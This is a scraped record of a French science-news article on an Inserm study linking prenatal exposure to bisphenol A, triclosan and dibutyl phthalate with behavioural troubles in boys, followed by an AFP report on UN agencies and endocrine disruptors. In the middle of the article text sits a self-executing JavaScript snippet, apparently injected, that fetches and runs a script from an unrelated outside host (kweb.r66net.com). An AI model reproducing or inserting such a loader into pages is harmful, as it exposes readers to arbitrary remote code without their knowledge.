{"title": "Les perturbateurs endocriniens associes a des troubles du comportement", "newspaper": "Futura Sciences", "author": ["Inserm (communique de la , salle de Presse, )"], "date_publi": "2017-10-02", "content": "Une etude menee par l'Inserm montre que l'exposition prenatale aux perturbateurs endocriniens est associee a des troubles du comportement chez les garcons de 3 a 5 ans. Les composes les plus preoccupants etaient le bisphenol A, le triclosan et le phtalate de dibutyle, ou DBP. Ce qu'il faut retenir L'etude a porte sur 500 garcons de la cohorte EDEN. Pendant la grossesse de leurs meres, un dosage a mesure les phtalates et les phenols dans l'urine. Il y avait une association entre des troubles emotionnels ou de l'hyperactivite chez les enfants et l'exposition aux perturbateurs endocriniens pendant la grossesse. Le bisphenol A a ete interdit de tous les contenants alimentaires en France en janvier 2015, une date ulterieure a la realisation de cette etude. Le triclosan est un agent antibacterien retrouve dans certains dentifrices et savons ; le DBP est utilise comme plastifiant dans les plastiques de type PVC, certaines colles, vernis a ongles et laques pour les cheveux. Triclosan et DBP sont reglementes selon la logique d'une valeur limite dans certaines familles de produits, tout en etant interdits dans d'autres (le DBP est par exemple interdit d'usage dans les cosmetiques et le triclosan dans les habits dans l'UE). Des etudes toxicologiques  in vitro  et chez l'animal ont mis en evidence que ces composes etaient des  perturbateurs endocriniens  et pouvaient interagir avec des systemes hormonaux impliques dans le developpement normal du systeme nerveux central. Les mecanismes precis qui pourraient expliquer un effet des  perturbateurs endocriniens  sur le neurodeveloppement et le comportement pourraient passer par une alteration du fonctionnement des  hormones  thyroidiennes, des hormones steroidiennes, comme l'oestrogene, ou d'autres hormones, comme l'ocytocine ou la vasopressine, des hormones secretees par l'hypothalamus. Face a ces premieres conclusions chez l'animal, les chercheurs ont souhaite etudier l'association entre les expositions aux perturbateurs endocriniens pendant la grossesse et le comportement ulterieur des enfants. Les femmes de la cohorte EDEN ont ete recrutees entre 2003 et 2006. Leur exposition aux perturbateurs endocriniens a ete evaluee par des tests urinaires. (c) sp4764, Fotolia                               Quelle exposition pour les femmes enceintes ? L'etude parue dans la revue  Environmental Health Perspectives a porte sur 529 petits garcons de la cohorte mere-enfant EDEN, mise en place par l'Inserm. Les femmes enceintes participant a cette cohorte ont ete recrutees entre 2003 et 2006 dans les CHU de Nancy et Poitiers. Aux troisieme et cinquieme anniversaires de l'enfant, ces mamans ont rempli un questionnaire standardise evaluant certains aspects du comportement de leur enfant tel que l'hyperactivite, les troubles emotionnels et les troubles relationnels.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Ce questionnaire standardise, utilise depuis une vingtaine d'annees, intitule << Questionnaire des forces et difficultes >> de l'enfant, permet d'etablir un score dans differentes dimensions du comportement telles que les symptomes emotionnels, les problemes de relation avec les pairs, les problemes de conduite, d'hyperactivite et d'inattention. Un echantillon d'urine preleve durant la grossesse a permis le dosage de biomarqueurs caracteristiques de l'exposition aux phenols et aux phtalates dans le laboratoire de Sante environnementale des CDC d'Atlanta, qui est en charge des campagnes de biosurveillance americaines. Voir aussi : Les perturbateurs endocriniens impliques dans le diabete et l'obesite De 70 a 100 % des femmes de la cohorte EDEN, recrutees durant leur grossesse entre 2003 et 2006, etaient alors exposees a des niveaux detectables de differentes substances. Les niveaux urinaires etaient de l'ordre de 1 a 3 ug par litre pour le bisphenol A, de 10 a 100 ug par litre pour le triclosan, et de 50 a 200 pour le methylparabene. Les resultats suggerent que l'exposition maternelle a certains phenols et phtalates est associee a des troubles du comportement des petits garcons. Hyperactivite et troubles relationnels  L'exposition au bisphenol A etait associee a une augmentation des troubles relationnels a 3 ans et des comportements de type hyperactif a 5 ans. Les chercheurs notent que ce travail confirme ainsi que les effets du bisphenol A sur le comportement observes chez l'animal de laboratoire se retrouvent chez l'humain a des expositions faibles, probablement inferieures a celles preconisees par l'autorite europeenne de securite alimentaire, l'EFSA. Le metabolite du DBP etait, lui, associe a davantage de troubles emotionnels et relationnels, incluant les comportements de repli, a 3 ans, mais pas a 5 pour les troubles emotionnels. Des associations entre ces composes et le comportement avaient deja ete mis en evidence dans des etudes precedentes chez de jeunes garcons et chez l'animal. Ainsi, dans une etude realisee a partir de femmes et d'enfants new-yorkais, une augmentation des comportements de repli chez les enfants de 3 ans avec des niveaux croissants du metabolite du DBP avaient ete rapportes en 2012. Les resultats de cette etude ont aussi montre une association entre le triclosan et une augmentation des troubles emotionnels a 3 et 5 ans. Il s'agit de la premiere etude evaluant les effets de ce compose sur le comportement, pour lequel l'equipe d'epidemiologie environnementale de Grenoble avait deja mis en evidence une diminution du perimetre cranien a la naissance, dans cette meme population.  Le saviez-vous ? Au niveau moleculaire, le triclosan est capable d'interagir avec l'axe thyroidien qui, pendant la grossesse, est implique dans le developpement du cerveau du foetus. L'effectif de l'etude, qui est une des plus vastes sur la question, ne permettait pas d'etudier directement la survenue de  pathologies  du comportement comme les troubles du spectre autistique, ce qui impliquerait de suivre des dizaines de milliers d'enfants. Les equipes de recherche vont desormais s'attacher a repliquer ces resultats au sein de la cohorte mere-enfant  SEPAGES  en cours dans la region grenobloise, coordonnee par l'Inserm et soutenue par l' European Research Council . Dans cette derniere, de nombreux echantillons d'urine par participant sont recueillis durant la grossesse et les premieres annees de vie de l'enfant. Cette approche permettra de limiter les erreurs de mesure de l'exposition et d'identifier de potentielles periodes de sensibilite aux phenols et phtalates sur differents evenements de sante tels que la croissance, le comportement ou la sante respiratoire. Cela permettra aussi d'etudier l'effet eventuel de ces substances chez les petites filles, qui n'avaient pu etre considerees ici. Il est possible que leur sensibilite aux perturbateurs endocriniens differe de celle des garcons. Pour en savoir plus Les perturbateurs endocriniens inquietent les agences de l'ONU Article de Nairobi - AFP, paru le 21 fevrier 2013 Dans un rapport, deux agences de l'ONU appellent a davantage de recherches sur les perturbateurs endocriniens. Ces composes, qui alterent nos systemes hormonaux, seraient a l'origine de nombreuses pathologies allant du  cancer  aux troubles de la fertilite en passant par des  maladies neurologiques . De nombreuses  substances chimiques , dont les effets perturbateurs sur le  systeme endocrinien  pourraient favoriser l' emergence de cancers  ou de troubles du systeme nerveux, doivent faire l'objet de recherches approfondies, plaident deux agences de l'ONU dans un  rapport  publie mardi. Le Programme des Nations unies pour l'environnement ( PNUE ) et l'Organisation mondiale de la sante ( OMS ) mettent en evidence les risques que representent ces substances, appelees perturbateurs endocriniens, quand elles penetrent dans l'environnement. Certains  perturbateurs endocriniens  sont naturels alors que d'autres, presents dans les  pesticides , les appareils electroniques, les produits d'hygiene personnelle et les  cosmetiques , sont synthetiques, souligne l'etude.  << Pres de 800 substances chimiques sont reconnues ou suspectees d'interferer avec les recepteurs hormonaux et avec la synthese ou la conversion des hormones >> , soulignent les agences.  << Toutefois, seule une petite fraction de ces substances ont ete etudiees par des tests a meme d'identifier leurs effets perturbateurs >> , ajoutent-elles. Des perturbateurs endocriniens qui rendent malade Ces perturbateurs chimiques entrent dans l'environnement  << principalement par le biais des effluents industriels et urbains, le ruissellement des  terres  agricoles et l' incineration  et le rejet des  dechets  >>  et l'etre humain y est expose via la  nourriture , la poussiere, l'eau ou quand il inhale du  gaz  ou des particules presents dans l' air . Le cancer du sein, dont on voit des cellules a l'image, est souvent sous l'influence des oestrogenes. Les perturbateurs endocriniens, qui peuvent avoir les memes effets physiologiques que l'hormone feminine, pourraient donc contribuer au developpement des tumeurs mammaires. (c) Annie Cavanagh, Wellcome Images, Flickr, CC by-nc-nd 2.0                               Ils peuvent contribuer a plusieurs types de pathologies, comme  << la  cryptorchidie  (absence d'un ou des deux  testicules  dans le scrotum) chez le jeune garcon, du  cancer du sein  chez la femme, du  cancer de la prostate , de troubles du developpement du systeme nerveux [...] chez l'enfant, ainsi que du  cancer de la thyroide  >> , selon les agences de l'ONU. Quel role jouent-ils ? On ne sait pas exactement... Dans certains pays, jusqu'a 40 % des jeunes hommes ont un  sperme de mauvaise qualite , ce qui altere leur capacite a concevoir un enfant, souligne par exemple le rapport, qui rappelle aussi que  << le taux global de cancers lies au systeme endocrinien a augmente sur les 40 a 50 dernieres annees >> . Pour autant, soulignent l' OMS  et le  PNUE , les connaissances encore  << tres lacunaires >>  ne permettent pas de connaitre precisement le role des perturbateurs chimiques dans l'augmentation de ce type de pathologies, d'autres facteurs environnementaux ou  << non  genetiques  >> , comme l'age et la  nutrition , pouvant aussi jouer. << Nous devons mener d'urgence davantage de recherches >> , conclut dans un communique Maria Neira, directeur du departement sante publique et environnement de l'OMS. Le bisphenol A a une dent contre nos dents                       D'apres une etude scientifique dirigee par Sylvie Babajko, le bisphenol A altererait l'expression de deux genes impliques dans la formation de l'email des dents chez le rat. L'extrapolation a l'Homme semble tout a fait plausible.                                       ", "theme": "sante"}